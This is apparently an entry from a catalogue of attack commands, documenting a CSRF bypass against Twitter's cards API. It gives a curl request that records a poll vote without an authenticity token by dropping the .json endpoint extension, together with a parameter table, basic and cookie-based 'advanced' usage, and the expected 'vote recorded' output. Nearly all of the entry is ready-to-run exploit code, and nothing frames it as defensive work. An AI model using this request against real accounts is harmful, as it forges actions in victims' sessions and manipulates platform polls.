---
id: cmd-bypassed-vote-95555
data: >-
  curl -X POST
  "https://twitter.com/i/cards/api/v1?tweet_id=657629231309041664&card_name=poll2choice_text_only&forward=false&capi_uri=capi%3A%2F%2Fpassthrough%2F1"
  -H "Content-Type: application/json" -d
  '{"twitter:string:card_uri":"card://657629230759415808","twitter:long:original_tweet_id":"657629231309041664","twitter:string:selected_choice":"2"}'
tags:
  - csrf
  - bypass
  - twitter
  - api
type: command
output: HTTP 200 OK (vote recorded)
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:28.988Z'
verified: false
validated: true
submitted: true
---
# Bypassed Vote Submission without JSON Extension

## Command

```bash
curl -X POST "https://twitter.com/i/cards/api/v1?tweet_id=657629231309041664&card_name=poll2choice_text_only&forward=false&capi_uri=capi%3A%2F%2Fpassthrough%2F1" \
  -H "Content-Type: application/json" \
  -d '{"twitter:string:card_uri":"card://657629230759415808","twitter:long:original_tweet_id":"657629231309041664","twitter:string:selected_choice":"2"}'
```

## Description

This command exploits the CSRF bypass by targeting the endpoint without .json extension, allowing vote submission without _authenticity_token while using the victim's session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| tweet_id | ID of the tweet containing the poll (e.g., 657629231309041664) | Yes |
| card_name | Type of poll card (e.g., poll2choice_text_only) | Yes |
| forward | Flag to disable forwarding (false) | Yes |
| capi_uri | Encoded passthrough URI (capi://passthrough/1) | Yes |
| twitter:string:card_uri | URI of the poll card (e.g., card://657629230759415808) | Yes |
| twitter:long:original_tweet_id | Original tweet ID | Yes |
| twitter:string:selected_choice | Index of the selected poll option (e.g., 2) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://twitter.com/i/cards/api/v1?tweet_id=EXAMPLE_ID&card_name=poll2choice_text_only&forward=false&capi_uri=capi%3A%2F%2Fpassthrough%2F1" -H "Content-Type: application/json" -d '{"twitter:string:card_uri":"card://EXAMPLE","twitter:long:original_tweet_id":"EXAMPLE_ID","twitter:string:selected_choice":"1"}'
```

### Advanced Usage

With session cookies for authenticated bypass:

```bash
curl -X POST "https://twitter.com/i/cards/api/v1?..." -H "Cookie: auth_token=..." ...
```

## Expected Output

HTTP 200 OK with vote successfully recorded, even without CSRF token.

## Related

- [[commands/normal-vote-submission-to-twitter-cards-api]]
- [[procedures/Bypass-CSRF-by-Modifying-Endpoint-Path]]
